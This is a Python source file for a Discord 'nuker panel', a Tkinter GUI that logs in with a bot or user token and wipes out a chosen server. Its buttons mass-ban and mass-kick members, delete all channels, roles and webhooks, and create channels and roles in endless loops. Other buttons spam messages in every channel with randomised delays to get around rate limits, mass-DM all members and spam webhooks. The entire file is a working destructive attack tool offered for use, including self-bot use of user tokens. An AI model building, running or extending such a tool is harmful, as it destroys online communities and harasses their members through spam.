from tkinter import *
import discord
import threading
import time
import asyncio
import random
import os
import webbrowser
import requests
from os import name
import discord
from discord import embeds
from discord.ext import commands, tasks
from discord.guild import Guild
from discord import app_commands
from discord.interactions import Interaction
from discord.invite import Invite
from discord import File
import json
import random
import asyncio
import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import dns.resolver
import aiohttp

os.system("cls")

intents = discord.Intents.all()
client = discord.Client(intents=intents)
bot_user = True
discord_start_bool = False
discord_already_triggered = False
login_frame = None
start_discord_button = None
token_entry = None
root = None
bot_user_var = None
guild_id_nuke = None
guild_id = None


def start_discord_client():
    global discord_start_bool
    discord_start_bool = True


class NukeOptions:

    @staticmethod
    def ban_all(server_id: int, blacklisted_users):
        global client
        guild = client.get_guild(server_id)

        async def start_ban_all():
            for member in guild.members:
                if str(member.id) not in blacklisted_users.split() and member.id != client.user.id:
                    try:
                        await member.ban(reason="Get Fucked By Glitched Studios Nuker Panel")
                    except Exception as e:
                        print(f"Error With Banning {member}: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_ban_all(), client.loop)

    @staticmethod
    def kick_all(server_id: int, blacklisted_users: str):
        global client
        guild = client.get_guild(server_id)

        async def start_kick_all():
            for member in guild.members:
                if str(member.id) not in blacklisted_users.split() and member.id != client.user.id:
                    try:
                        await member.kick(reason="Get Fucked By Glitched Studios Nuker Panel")
                    except Exception as e:
                        print(f"Error With Kicking {member}: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_kick_all(), client.loop)

    @staticmethod
    def delete_all_channels(server_id: int):
        global client
        guild = client.get_guild(server_id)

        async def start_deleting_channels():
            for channel in guild.channels:
                try:
                    await channel.delete()
                except Exception as e:
                    print(f"Error With Deleting Channel {channel}: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_deleting_channels(), client.loop)

    @staticmethod
    def spam_make_channels(server_id: int, channel_name: str):
        global client
        guild = client.get_guild(server_id)

        async def start_spamming_channels():
            while True:
                try:
                    await guild.create_text_channel(channel_name)
                except Exception as e:
                    print(f"Error With Making Channels: {str(e)}")
                    if "Maximum number of server channels reached" in str(e):
                        break

        asyncio.run_coroutine_threadsafe(start_spamming_channels(), client.loop)

    @staticmethod
    def delete_all_roles(server_id: int):
        global client
        guild = client.get_guild(server_id)

        async def start_deleting_roles():
            for role in guild.roles:
                try:
                    await role.delete()
                except Exception as e:
                    print(f"Error Deleting Role {role}: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_deleting_roles(), client.loop)

    @staticmethod
    def spam_make_roles(server_id: int, role_name: str):
        global client
        role_name = role_name.replace("-", " ")
        role_name = role_name.replace("_", " ")

        guild = client.get_guild(server_id)

        async def start_spamming_roles():
            while True:
                try:
                    await guild.create_role(name=role_name,
                                            colour=discord.Colour.from_rgb(random.randint(0, 255),
                                                                           random.randint(0, 255),
                                                                           random.randint(0, 255)))
                except Exception as e:
                    print(f"Error With Making Roles: {str(e)}")
                    if "Maximum number of server roles reached" in str(e):
                        break

        asyncio.run_coroutine_threadsafe(start_spamming_roles(), client.loop)

    @staticmethod
    def spam_message(server_id: int, message: str):
        global client
        message = message.replace("+-", " ")

        guild = client.get_guild(server_id)

        semaphore = asyncio.Semaphore(5)

        async def start_spamming_messages():
            tasks = []
            for channel in guild.channels:
                task = client.loop.create_task(send_message(channel, message))
                tasks.append(task)

            await asyncio.gather(*tasks, return_exceptions=True)

        async def send_message(channel, message):
            while True:
                async with semaphore:
                    try:
                        await channel.send(message)
                    except discord.Forbidden:
                        pass
                    except discord.errors.RateLimited as e:
                        delay = e.retry_after + random.uniform(0, 1)
                        print(f"Rate limit error. Waiting for {delay} seconds.")
                        await asyncio.sleep(delay)
                    except Exception as e:
                        print(f"Error With Sending Spam Message: {str(e)}")
                    await asyncio.sleep(random.uniform(0.01, 0.1))  # randomize delay

        asyncio.run_coroutine_threadsafe(start_spamming_messages(), client.loop)

    @staticmethod
    def message_all(server_id: int, message: str):
        global client
        message = message.replace("+-", " ")
        guild = client.get_guild(server_id)

        async def start_messaging_all():
            for member in guild.members:
                try:
                    await member.send(message)
                except Exception as e:
                    print(f"Error With Messaging {member}: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_messaging_all(), client.loop)
    @staticmethod
    def delete_all_webhooks(server_id: int):
        global client
        guild = client.get_guild(server_id)

        async def start_deleting_webhooks():
            for webhook in await guild.webhooks():
                try:
                    await webhook.delete()
                except Exception as e:
                    print(f"Error With Deleting Webhook: {str(e)}")

        asyncio.run_coroutine_threadsafe(start_deleting_webhooks(), client.loop)
    @staticmethod
    def spam_webhooks(server_id: int, message: str):
        global client
        guild = client.get_guild(server_id)

        async def start_spamming_webhooks():
            for _ in range(100):
                webhook = await guild.create_webhook(name="Glitched Studios Nuker Panel")
                try:
                    await webhook.send(message)
                except Exception as e:
                    print(f"Error With Sending Message: {str(e)}")
                finally:
                    await webhook.delete()

        asyncio.run_coroutine_threadsafe(start_spamming_webhooks(), client.loop)


class WebBrowserButtons:

    @staticmethod
    def open_discord():
        webbrowser.open("https://discord.gg/H6cJhhZJXK")

    @staticmethod
    def open_bot_invite_link():
        global client
        webbrowser.open(
            f"https://discord.com/oauth2/authorize?client_id={str(client.user.id)}&scope=bot&permissions=8589934591")


class WindowAspects:

    @staticmethod
    def nuke_options():
        global start_discord_button, token_entry, login_frame, client, root, guild_id, bot_user
        root.geometry("550x441")
        token_entry.destroy()
        start_discord_button.destroy()
        login_frame.destroy()
        root.title("Glitched Studios Nuker Panel")
        main_frame = Frame(root, bg="black")
        main_frame.pack()

        main_info_frame = LabelFrame(main_frame, text="Setting And Info Panel", bg="black", fg="yellow")
        main_info_frame.grid(row=0, column=0, padx=2, pady=2)

        main_nuke_frame = LabelFrame(main_frame, text="Nuke Panel", bg="black", fg="yellow")
        main_nuke_frame.grid(row=0, column=1, padx=2, pady=2)

        client_info_frame = LabelFrame(main_info_frame, text="Client Information", bg="black", fg="yellow")
        client_info_frame.grid(row=0, column=0, padx=2, pady=2)

        guild_info_frame = LabelFrame(main_info_frame, text="Guild Information", bg="black", fg="yellow")
        guild_info_frame.grid(row=1, column=0, padx=2, pady=2)

        nuker_info_frame = LabelFrame(main_info_frame, text="Nuker Info", bg="black", fg="yellow")
        nuker_info_frame.grid(row=2, column=0, padx=2, pady=2)

        member_nuke_options_frame = LabelFrame(main_nuke_frame, text="Member Nuke Options", bg="black", fg="yellow")
        member_nuke_options_frame.grid(row=0, column=0, padx=2, pady=2)

        channel_options_frame = LabelFrame(main_nuke_frame, text="Channel Nuke Options", bg="black", fg="yellow")
        channel_options_frame.grid(row=1, column=0, padx=2, pady=2)

        roles_nuke_options_frame = LabelFrame(main_nuke_frame, text="Role Nuke Options", bg="black", fg="yellow")
        roles_nuke_options_frame.grid(row=2, column=0, padx=2, pady=2)

        text_nuke_options_frame = LabelFrame(main_nuke_frame, text="Text Nuke Options", bg="black", fg="yellow")
        text_nuke_options_frame.grid(row=3, column=0, padx=2, pady=2)

        webhookoptions_frame = LabelFrame(main_nuke_frame, text="Webhook Options", bg="black", fg="yellow")
        webhookoptions_frame.grid(row=4, column=0, padx=2, pady=2)

        client_user = Label(client_info_frame, text=f"User: {str(client.user.display_name)}", bg="black", fg="red")
        client_user.grid(row=0, column=0, padx=2, pady=2)

        client_guilds = Label(client_info_frame, text=f"User Guilds: {str(len(client.guilds))}", bg="black", fg="red")
        client_guilds.grid(row=1, column=0, padx=2, pady=2)

        if bot_user:
            invite_bot_button = Button(client_info_frame, text="Invite Discord Bot",
                                       command=WebBrowserButtons.open_bot_invite_link, bg="black", fg="green", width=17)
            invite_bot_button.grid(row=2, column=0, padx=2, pady=2)

        guild_id = Entry(guild_info_frame, bg="black", fg="red", width=14)
        guild_id.grid(row=0, column=0, padx=2, pady=2)
        guild_id.insert(0, "Guild ID")

        developer_tag_label = Label(nuker_info_frame, text="Developer: Glitched Studios", bg="black", fg="red")
        developer_tag_label.grid(row=0, column=0, padx=2, pady=2)

        discord_button = Button(nuker_info_frame, text="Join The Discord",
                                command=WebBrowserButtons.open_discord, bg="black", fg="green", width=17)
        discord_button.grid(row=2, column=0, padx=2, pady=2)


        def get_guild_data():
            global root, guild_id_nuke, guild_id
            guild_id_nuke = int(guild_id.get())

            guild_id.destroy()
            get_guild_data_button.destroy()

            guild = client.get_guild(guild_id_nuke)

            server_name_label = Label(guild_info_frame, text=f"Name: {guild.name}", bg="black", fg="red")
            server_name_label.grid(row=0, column=0, padx=2, pady=2)

            server_id_label = Label(guild_info_frame, text=f"ID: {str(guild.id)}", bg="black", fg="red")
            server_id_label.grid(row=1, column=0, padx=2, pady=2)

            server_owner_label = Label(guild_info_frame, text=f"Owner: {guild.owner}", bg="black", fg="red")
            server_owner_label.grid(row=2, column=0, padx=2, pady=2)

            server_created_label = Label(guild_info_frame, text=f"Created: {str(guild.created_at)[:19]}", bg="black",
                                         fg="red")
            server_created_label.grid(row=3, column=0, padx=2, pady=2)

        get_guild_data_button = Button(guild_info_frame, text="Set Guild",
                                       command=get_guild_data, bg="black",
                                       fg="red", width=17)
        get_guild_data_button.grid(row=1, column=0, padx=2, pady=2)

        ban_all_button = Button(member_nuke_options_frame, text="Ban All Members",
                                command=lambda: NukeOptions.ban_all(guild_id_nuke, ban_blacklisted_users.get()),
                                bg="black", fg="red", width=17)
        ban_all_button.grid(row=0, column=0, padx=2, pady=2)
        ban_blacklisted_users = Entry(member_nuke_options_frame, bg="black", fg="orange", width=14)
        ban_blacklisted_users.grid(row=0, column=1, padx=2, pady=2)
        ban_blacklisted_users.insert(0, "Except User ID's")

        kick_all_button = Button(member_nuke_options_frame, text="Kick All Members",
                                 command=lambda: NukeOptions.kick_all(guild_id_nuke, kick_blacklisted_users.get()),
                                 bg="black", fg="red", width=17)
        kick_all_button.grid(row=1, column=0, padx=2, pady=2)
        kick_blacklisted_users = Entry(member_nuke_options_frame, bg="black", fg="orange", width=14)
        kick_blacklisted_users.grid(row=1, column=1, padx=2, pady=2)
        kick_blacklisted_users.insert(0, "Except User ID's")

        delete_all_channels_button = Button(channel_options_frame, text="Delete All Channels",
                                            command=lambda: NukeOptions.delete_all_channels(guild_id_nuke),
                                            bg="black", fg="red", width=17)
        delete_all_channels_button.grid(row=0, column=0, padx=2, pady=2)
        delete_all_channel_no_options_label = Label(channel_options_frame, text="No Options", bg="black", fg="orange")
        delete_all_channel_no_options_label.grid(row=0, column=1, padx=2, pady=2)

        spam_make_channels_button = Button(channel_options_frame, text="Spam Make Channels",
                                           command=lambda: NukeOptions.spam_make_channels(guild_id_nuke,
                                                                                          spam_make_channels_name.get().replace(
                                                                                              " ", "-")),
                                           bg="black", fg="red", width=17)
        spam_make_channels_button.grid(row=1, column=0, padx=2, pady=2)
        spam_make_channels_name = Entry(channel_options_frame, bg="black", fg="orange", width=14)
        spam_make_channels_name.grid(row=1, column=1, padx=2, pady=2)
        spam_make_channels_name.insert(0, "Channel Name")

        delete_all_roles_button = Button(roles_nuke_options_frame, text="Delete All Roles",
                                         command=lambda: NukeOptions.delete_all_roles(guild_id_nuke), bg="black",
                                         fg="red", width=17)
        delete_all_roles_button.grid(row=0, column=0, padx=2, pady=2)
        delete_all_roles_no_options_label = Label(roles_nuke_options_frame, text="No Options", bg="black", fg="orange")
        delete_all_roles_no_options_label.grid(row=0, column=1, padx=2, pady=2)

        spam_make_roles_button = Button(roles_nuke_options_frame, text="Spam Make Roles",
                                        command=lambda: NukeOptions.spam_make_roles(guild_id_nuke,
                                                                                    spam_role_name_entry.get().replace(
                                                                                        " ", "-")),
                                        bg="black", fg="red", width=17)
        spam_make_roles_button.grid(row=1, column=0, padx=2, pady=2)
        spam_role_name_entry = Entry(roles_nuke_options_frame, bg="black", fg="orange", width=14)
        spam_role_name_entry.grid(row=1, column=1, padx=2, pady=2)
        spam_role_name_entry.insert(0, "Role Name")

        spam_messages_button = Button(text_nuke_options_frame, text="Spam Message",
                                      command=lambda: NukeOptions.spam_message(
                                          guild_id_nuke, spam_messages_message_entry.get().replace(
                                              " ", "+-")), bg="black", fg="red", width=17)
        spam_messages_button.grid(row=0, column=0, padx=2, pady=2)
        spam_messages_message_entry = Entry(text_nuke_options_frame, bg="black", fg="orange", width=14)
        spam_messages_message_entry.grid(row=0, column=1, padx=2, pady=2)
        spam_messages_message_entry.insert(0, "Message")

        message_all_button = Button(text_nuke_options_frame, text="DM All", command=lambda: NukeOptions.message_all(
            guild_id_nuke, message_all_message_entry.get().replace(" ", "+-")), bg="black", fg="red", width=17)
        message_all_button.grid(row=1, column=0, padx=2, pady=2)
        message_all_message_entry = Entry(text_nuke_options_frame, bg="black", fg="orange", width=14)
        message_all_message_entry.grid(row=1, column=1, padx=2, pady=2)
        message_all_message_entry.insert(0, "Message")

        delete_all_webhooks_button = Button(webhookoptions_frame, text="Delete All Webhooks", command=lambda: NukeOptions.delete_all_webhooks(guild_id_nuke),bg="black",
                                         fg="red", width=17)
        delete_all_webhooks_button.grid(row=0, column=0, padx=2, pady=2)
        delete_all_webhooks = Label(webhookoptions_frame, text="No Options", bg="black", fg="orange")
        delete_all_webhooks.grid(row=0, column=1, padx=2, pady=2)
        spam_all_webhooks_button = Button(webhookoptions_frame, text="Spam All Webhooks", command=lambda: NukeOptions.spam_webhooks(
            guild_id_nuke, spam_all_webhooks_entry), bg="black", fg="red", width=17)
        spam_all_webhooks_button.grid(row=1, column=0, padx=2, pady=2)
        spam_all_webhooks_entry = Entry(webhookoptions_frame, bg="black", fg="orange", width=14)
        spam_all_webhooks_entry.grid(row=1, column=1, padx=2, pady=2)
        spam_all_webhooks_entry.insert(0, "Message")
    @staticmethod
    def window():
        global token_entry, root, start_discord_button, login_frame, bot_user_var, bot_user
        root = Tk()
        root["bg"] = "black"
        root.title("Glitched Studios Nuker Panel")
        root.geometry("250x85")
        login_frame = LabelFrame(root, text="Login Information", bg="black", fg="yellow")
        login_frame.pack()
        token_entry = Entry(login_frame, bg="black", fg="red")
        token_entry.grid(row=0, column=0, padx=2, pady=2)
        token_entry.insert(0, "Token Here")
        bot_user_var = BooleanVar()
        bot_user = Checkbutton(login_frame, text="User Token?", variable=bot_user_var, bg="black", fg="orange")
        bot_user.grid(row=0, column=1, padx=2, pady=2)
        start_discord_button = Button(root, text="Start", command=start_discord_client, bg="black",
                                      fg="red")
        start_discord_button.pack(pady=2)
        root.mainloop()


def start_discord():
    global discord_start_bool, discord_already_triggered, client, bot_user_var, token_entry, bot_user
    while True:
        if discord_start_bool and not discord_already_triggered:
            discord_already_triggered = True
            token = token_entry.get()

            if "Enter Token" in token:
                token = token.replace("Enter Token", "")

            if "\"" in token:
                token = token.replace("\"", "")
                print(token)

            bot_user = not bot_user_var.get()

            @client.event
            async def on_ready():
                print(f"Logged into user: {client.user.display_name}")
                WindowAspects.nuke_options()

            if bot_user:
                print("""[NOTE] For bot accounts make sure that you have intents enabled! On the bot tab on your Discord
Developer Portal application, enable both intents.""")
                client.run(token)
            else:
                print("""[NOTE] Some features may not work as intended on user accounts, due to the new discord API
- This is due to the new Intents System put in place and so features like Mass DM/Ban/Kick may not
  work as well.
- This stated, I recommend if you have Administrator Permissions, you add a discord bot
  to the server, you can create one at the Discord Developer Portal.""")
                client.run(token, bot=False)

        time.sleep(0.1)


def main():
    os.system("cls")

    window_thread = threading.Thread(target=WindowAspects.window)
    discord_thread = threading.Thread(target=start_discord)
    window_thread.start()
    discord_thread.start()
    window_thread.join()
    discord_thread.join()


if __name__ == "__main__":
    main()